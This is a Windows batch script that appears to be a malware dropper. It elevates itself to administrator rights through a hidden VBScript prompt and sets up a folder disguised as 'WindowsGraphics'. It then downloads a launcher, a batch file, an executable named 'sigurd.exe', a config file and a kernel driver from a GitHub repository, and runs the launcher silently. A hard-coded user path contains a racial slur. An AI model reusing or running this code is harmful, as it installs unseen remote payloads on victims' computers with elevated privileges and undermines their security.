@echo off
setlocal

:: ============================================================
:: 1. UAC ELEVATION (Runs Hidden)
:: ============================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\admin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "%temp%\admin.vbs"
    wscript "%temp%\admin.vbs"
    exit /b
)
if exist "%temp%\admin.vbs" del "%temp%\admin.vbs"

:: ============================================================
:: 2. DIRECTORY SETUP & CLEANUP
:: ============================================================
set "workDir=C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics"
if not exist "%workDir%" mkdir "%workDir%" >nul 2>&1
cd /d "%workDir%"
if not exist "driver" mkdir "driver" >nul 2>&1

:: Delete the old/broken task from your screenshot before starting
schtasks /delete /tn "MyUpdateTask" /f >nul 2>&1
schtasks /delete /tn "ForexForgeSync" /f >nul 2>&1

:: ============================================================
:: 3. DOWNLOADS (With Cache-Buster)
:: ============================================================
:: Using the direct RAW GitHub domain for stability
set "base=https://raw.githubusercontent.com/g00glecenter101-arch/Keep/main"
set "psF=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile"

:: Download the "Sticky" launcher (ONLY ONCE)
powershell -Command "%psF%('%base%/launcher.vbs?v=%RANDOM%', 'launcher.vbs')"

:: Download the rest of the payload
powershell -Command "%psF%('%base%/boom.bat?v=%RANDOM%', 'boom.bat')"
powershell -Command "%psF%('%base%/sigurd.exe?v=%RANDOM%', 'sigurd.exe')"
powershell -Command "%psF%('%base%/Config.toml?v=%RANDOM%', 'Config.toml')"
powershell -Command "%psF%('%base%/drivers/K7RKScan.sys?v=%RANDOM%', 'driver\k7RKScan.sys')"

:: ============================================================
:: 4. THE SILENT HANDOFF
:: ============================================================
:: This starts the launcher, which triggers the UAC and the Blue Window
if exist "launcher.vbs" (
    start "" "wscript.exe" "launcher.vbs"
)

exit
